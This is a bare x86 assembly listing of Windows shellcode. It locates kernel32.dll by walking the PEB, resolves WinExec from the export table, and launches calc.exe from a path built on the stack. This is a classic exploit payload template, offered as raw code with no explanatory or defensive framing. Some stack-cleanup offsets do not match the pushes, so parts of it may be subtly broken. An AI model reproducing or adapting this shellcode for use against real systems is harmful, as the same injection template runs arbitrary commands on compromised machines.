start:
        push eax
        push ebx
        push ecx
        push edx
        push esi
        push edi
        push ebp

        push ebp
        mov ebp, esp
        sub esp, 18h

        xor esi, esi
        push 00636578h
        push 456e6957h
        mov [ebp - 4], esp       ;var4 = WinExec\0x00

        xor esi, esi
        mov ebx, [fs:30h]
        mov ebx, [ebx + 0x0C]
        mov ebx, [ebx + 0x14]
        mov ebx, [ebx]
        mov ebx, [ebx]
        mov ebx, [ebx + 0x10]
        mov [ebp - 8], ebx      ;var8 = kernel32.dll base address

        mov eax, [ebx + 0x3C]
        add eax, ebx
        mov eax, [eax + 0x78]
        add eax, ebx            ;address of export table

        mov ecx, [eax + 24h]
        add ecx, ebx            ;address of ordinal table
        mov [ebp - 0Ch], ecx    ;var12 = address of ordinal table

        mov edi, [eax + 20h]
        add edi, ebx            ;address of name pointer table
        mov [ebp - 10h], edi    ;var16 = address of name pointer table

        mov edx, [eax + 1Ch]
        add edx, ebx
        mov [ebp - 14h], edx    ;var20 = address of address table

        mov edx, [eax + 14h]    ;number of exported functions

        xor eax, eax

        .loop:
                mov edi, [ebp - 10h]    ;var16
                mov esi, [ebp - 4]      ;WinExec\0xcc
                xor ecx, ecx

                cld
                mov edi, [edi + eax*4]
                add edi, ebx
                add ecx, 8
                repe cmpsb

                jz start.found

                inc eax
                cmp eax, edx
                jb start.loop

                add esp, 26h
                std
                jmp start.end

        .found:
                mov ecx, [ebp - 0Ch]
                mov edx, [ebp - 14h]
                mov ax, [ecx + eax*2]
                mov eax, [edx + eax*4]
                add eax, ebx            ;address of WinExec function

                xor edx, edx
                push edx
                push 6578652eh
                push 636c6163h
                push 5c32336dh
                push 65747379h
                push 535c7377h
                push 6f646e69h
                push 575c3a43h
                mov esi, esp

                push 10
                push esi
                call eax

                add esp, 43h

        .end:
                pop ebp                 ; restore all registers and exit
                pop edi
                pop esi
                pop edx
                pop ecx
                pop ebx
                pop eax